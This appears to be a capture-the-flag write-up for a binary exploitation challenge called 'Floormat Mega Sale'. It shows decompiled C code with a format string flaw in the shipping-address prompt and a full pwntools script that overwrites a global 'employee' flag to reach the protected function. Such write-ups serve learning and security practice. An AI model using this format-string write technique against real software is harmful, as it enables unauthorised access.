---
description: Binary Exploitation
---

# Floormat Mega Sale

> The Floor Mat Store is running a mega sale, check it out!
>
> Author: CryptoCat

{% file src="../../.gitbook/assets/floormat_sale.zip" %}

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

A simple shop challenge, the goal is to buy the exclusive employee mat:

```c
  setvbuf(stdout,(char *)0x0,2,0);
  local_48[0] = "1. Cozy Carpet Mat - $10";
  local_48[1] = "2. Wooden Plank Mat - $15";
  local_48[2] = "3. Fuzzy Shag Mat - $20";
  local_48[3] = "4. Rubberized Mat - $12";
  local_28 = "5. Luxury Velvet Mat - $25";
  local_20 = "6. Exclusive Employee-only Mat - $9999";
  local_10 = getegid();
```

The problem is, attempting to buy the Exclusive Employee-only Mat calls a special check for the employee variable:

```c
  if ((0 < local_14c) && (local_14c < 7)) {
    do {
      iVar1 = getchar();
    } while (iVar1 != 10);
    puts("\nPlease enter your shipping address:");
    fgets(local_148,0x100,stdin);
    puts("\nYour floor mat will be shipped to:\n");
    printf(local_148);
    if (local_14c == 6) {
      employee_access();
    }
    return 0;
  }
```

```c
void employee_access(void)

{
  char local_58 [72];
  FILE *local_10;
  
  if (employee == 0) {
    puts("\nAccess Denied: You are not an employee!");
  }
  else {
```

Since the employee variable is global, we can make a format string payload using pwntools and input it as the "Shipping Address". Full script:

```python
# -*- coding: utf-8 -*-
# -*- template: winterbitia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'floormat_sale')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or 'riggedslot2.ctf.intigriti.io'
port = int(args.PORT or 1339)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
# break *employee_access
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()

EMPLOYEE_VAR = 0x000000000040408c
log.success(f'Employee Var: {p64(EMPLOYEE_VAR)}')

payload = fmtstr_payload(10, {EMPLOYEE_VAR : 1})

log.info(io.clean())
io.sendline(b'6')
log.info(io.clean())
io.sendline(payload)
log.info(io.clean())

io.interactive()
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
